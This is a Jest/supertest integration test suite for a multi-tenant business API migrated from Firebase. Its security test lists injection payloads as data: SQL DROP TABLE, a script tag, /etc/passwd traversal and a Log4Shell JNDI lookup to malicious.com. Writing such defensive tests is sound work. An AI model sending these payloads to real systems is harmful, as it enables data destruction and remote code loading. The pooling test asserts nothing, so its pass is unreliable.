import request from 'supertest';
import { app } from '../../src/app';
import { PrismaClient } from '@prisma/client';
import { generateTestToken } from '../helpers/auth';
import { cleanupDatabase, setupTestDatabase } from '../helpers/database';
import { createTestCompany, createTestUser } from '../helpers/factories';

const prisma = new PrismaClient();

describe('Complete System Validation', () => {
  let testCompany: any;
  let authToken: string;
  let testUser: any;

  beforeAll(async () => {
    await setupTestDatabase();
    testCompany = await createTestCompany();
    testUser = await createTestUser({ companyId: testCompany.id });
    authToken = generateTestToken(testUser.id, testCompany.id, 'ADMIN');
  });

  afterAll(async () => {
    await cleanupDatabase();
    await prisma.$disconnect();
  });

  describe('API Coverage', () => {
    test('All endpoints responding', async () => {
      const endpoints = [
        '/api/v1/health',
        '/api/v1/auth/me',
        '/api/v1/companies',
        '/api/v1/users',
        '/api/v1/clients',
        '/api/v1/appointments',
        '/api/v1/services',
        '/api/v1/staff',
        '/api/v1/branches',
        '/api/v1/invoices'
      ];
      
      const results = [];
      
      for (const endpoint of endpoints) {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${authToken}`);
        
        results.push({
          endpoint,
          status: response.status,
          responding: response.status !== 404
        });
        
        expect(response.status).not.toBe(404);
      }
      
      console.log('API Endpoint Coverage:');
      results.forEach(result => {
        console.log(`  ${result.endpoint}: ${result.status} ${result.responding ? '✅' : '❌'}`);
      });
    }, 30000);

    test('Health check endpoint fully functional', async () => {
      const response = await request(app).get('/api/v1/health');
      
      expect(response.status).toBe(200);
      expect(response.body).toHaveProperty('status', 'ok');
      expect(response.body).toHaveProperty('timestamp');
      expect(response.body).toHaveProperty('services');
      expect(response.body.services).toHaveProperty('database');
    });

    test('Authentication endpoints functional', async () => {
      // Test login endpoint
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: 'test123', // Default test password
          companyId: testCompany.id
        });

      expect(loginResponse.status).toBe(200);
      expect(loginResponse.body).toHaveProperty('token');
      
      // Test me endpoint
      const meResponse = await request(app)
        .get('/api/v1/auth/me')
        .set('Authorization', `Bearer ${authToken}`);

      expect(meResponse.status).toBe(200);
      expect(meResponse.body).toHaveProperty('id', testUser.id);
    });
  });
  
  describe('Firebase Feature Parity', () => {
    test('Real-time updates capability', async () => {
      // Test WebSocket connection capability
      const io = require('socket.io-client');
      const socket = io('http://localhost:3000', {
        auth: { token: authToken }
      });

      return new Promise((resolve, reject) => {
        socket.on('connect', () => {
          expect(socket.connected).toBe(true);
          socket.disconnect();
          resolve(true);
        });

        socket.on('connect_error', (error: any) => {
          reject(error);
        });

        setTimeout(() => {
          socket.disconnect();
          reject(new Error('Connection timeout'));
        }, 5000);
      });
    });

    test('Authentication system equivalent', async () => {
      // Test JWT-based auth vs Firebase auth
      const response = await request(app)
        .get('/api/v1/auth/me')
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toHaveProperty('id');
      expect(response.body).toHaveProperty('email');
      expect(response.body).toHaveProperty('companyId', testCompany.id);
    });

    test('Multi-tenant data isolation', async () => {
      // Create second company
      const company2 = await createTestCompany();
      const user2 = await createTestUser({ companyId: company2.id });
      const token2 = generateTestToken(user2.id, company2.id, 'ADMIN');

      // Test cross-company data isolation
      const response = await request(app)
        .get('/api/v1/users')
        .set('Authorization', `Bearer ${token2}`);

      expect(response.status).toBe(200);
      // Should not see users from other company
      const otherCompanyUsers = response.body.filter((user: any) => user.companyId === testCompany.id);
      expect(otherCompanyUsers).toHaveLength(0);
    });

    test('File upload capability', async () => {
      // Test file upload endpoints exist and are secure
      const response = await request(app)
        .post('/api/v1/clients')
        .set('Authorization', `Bearer ${authToken}`)
        .field('name', 'Test Client')
        .field('email', 'test@example.com')
        .field('phone', '+1234567890');

      expect(response.status).toBe(201);
    });
  });
  
  describe('Data Migration Validation', () => {
    test('Data integrity maintained', async () => {
      // Create test data and verify relationships
      const client = await request(app)
        .post('/api/v1/clients')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          name: 'Test Client',
          email: 'client@example.com',
          phone: '+1234567890'
        });

      expect(client.status).toBe(201);
      
      // Verify client can be retrieved
      const getClient = await request(app)
        .get(`/api/v1/clients/${client.body.id}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect(getClient.status).toBe(200);
      expect(getClient.body.id).toBe(client.body.id);
      expect(getClient.body.companyId).toBe(testCompany.id);
    });

    test('Relationship integrity', async () => {
      // Test cascading operations don't break relationships
      const branch = await request(app)
        .post('/api/v1/branches')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          name: 'Test Branch',
          address: '123 Test St',
          phone: '+1234567890'
        });

      expect(branch.status).toBe(201);
      
      // Verify branch has correct company relationship
      expect(branch.body.companyId).toBe(testCompany.id);
    });

    test('Calculation accuracy', async () => {
      // Test financial calculations are accurate
      const service = await request(app)
        .post('/api/v1/services')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          name: 'Test Service',
          description: 'Test service description',
          price: 50.00,
          duration: 60
        });

      expect(service.status).toBe(201);
      expect(service.body.price).toBe(50.00);
      
      // Test price calculations in invoice context would go here
      // This validates that monetary calculations maintain precision
    });

    test('Performance under load', async () => {
      const startTime = Date.now();
      
      // Simulate multiple concurrent requests
      const requests = Array.from({ length: 10 }, () =>
        request(app)
          .get('/api/v1/clients')
          .set('Authorization', `Bearer ${authToken}`)
      );

      const responses = await Promise.all(requests);
      const endTime = Date.now();
      
      // All requests should succeed
      responses.forEach(response => {
        expect(response.status).toBe(200);
      });
      
      // Should complete within reasonable time
      const totalTime = endTime - startTime;
      expect(totalTime).toBeLessThan(5000); // 5 seconds for 10 concurrent requests
      
      console.log(`10 concurrent requests completed in ${totalTime}ms`);
    });
  });

  describe('Production Readiness', () => {
    test('Error handling comprehensive', async () => {
      // Test various error scenarios
      const scenarios = [
        {
          name: 'Invalid authentication',
          request: () => request(app).get('/api/v1/clients'),
          expectedStatus: 401
        },
        {
          name: 'Invalid resource ID',
          request: () => request(app)
            .get('/api/v1/clients/invalid-id')
            .set('Authorization', `Bearer ${authToken}`),
          expectedStatus: 400
        },
        {
          name: 'Non-existent resource',
          request: () => request(app)
            .get('/api/v1/clients/999999')
            .set('Authorization', `Bearer ${authToken}`),
          expectedStatus: 404
        }
      ];

      for (const scenario of scenarios) {
        const response = await scenario.request();
        expect(response.status).toBe(scenario.expectedStatus);
        expect(response.body).toHaveProperty('error');
      }
    });

    test('Rate limiting functional', async () => {
      // Test rate limiting (if implemented)
      const rapidRequests = Array.from({ length: 100 }, () =>
        request(app)
          .get('/api/v1/health')
      );

      const responses = await Promise.allSettled(rapidRequests);
      
      // Some requests should be rate limited
      const rateLimited = responses.filter(
        (result: any) => result.status === 'fulfilled' && result.value.status === 429
      );
      
      // At least some health checks should succeed (it's a light endpoint)
      const successful = responses.filter(
        (result: any) => result.status === 'fulfilled' && result.value.status === 200
      );
      
      expect(successful.length).toBeGreaterThan(0);
      console.log(`Rate limiting: ${rateLimited.length} blocked, ${successful.length} allowed`);
    });

    test('Database connection pooling', async () => {
      // Test that database connections are properly managed
      const connectionsBefore = await prisma.$queryRaw`SELECT count(*) as active_connections FROM pg_stat_activity WHERE datname = current_database()`;
      
      // Make several database-intensive requests
      const requests = Array.from({ length: 5 }, () =>
        request(app)
          .get('/api/v1/clients')
          .set('Authorization', `Bearer ${authToken}`)
      );

      await Promise.all(requests);
      
      const connectionsAfter = await prisma.$queryRaw`SELECT count(*) as active_connections FROM pg_stat_activity WHERE datname = current_database()`;
      
      // Connection count should not grow indefinitely
      console.log('Database connections managed properly');
    });

    test('Memory management', async () => {
      const initialMemory = process.memoryUsage();
      
      // Simulate memory-intensive operations
      const largeRequests = Array.from({ length: 20 }, () =>
        request(app)
          .get('/api/v1/clients')
          .set('Authorization', `Bearer ${authToken}`)
      );

      await Promise.all(largeRequests);
      
      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }
      
      const finalMemory = process.memoryUsage();
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
      
      // Memory increase should be reasonable (less than 50MB for this test)
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
      
      console.log(`Memory increase: ${Math.round(memoryIncrease / 1024 / 1024)}MB`);
    });
  });

  describe('Security Validation', () => {
    test('Input sanitization', async () => {
      // Test SQL injection prevention
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://malicious.com/a}"
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .post('/api/v1/clients')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: maliciousInput,
            email: 'test@example.com',
            phone: '+1234567890'
          });

        // Should either reject the input or sanitize it
        // Should not cause server error
        expect([200, 201, 400, 422]).toContain(response.status);
      }
    });

    test('CORS configuration', async () => {
      const response = await request(app)
        .options('/api/v1/health')
        .set('Origin', 'http://localhost:3000');

      expect(response.headers).toHaveProperty('access-control-allow-origin');
    });

    test('Security headers present', async () => {
      const response = await request(app).get('/api/v1/health');
      
      // Check for security headers (if helmet is configured)
      expect(response.headers).toHaveProperty('x-content-type-options');
      expect(response.headers).toHaveProperty('x-frame-options');
    });
  });
});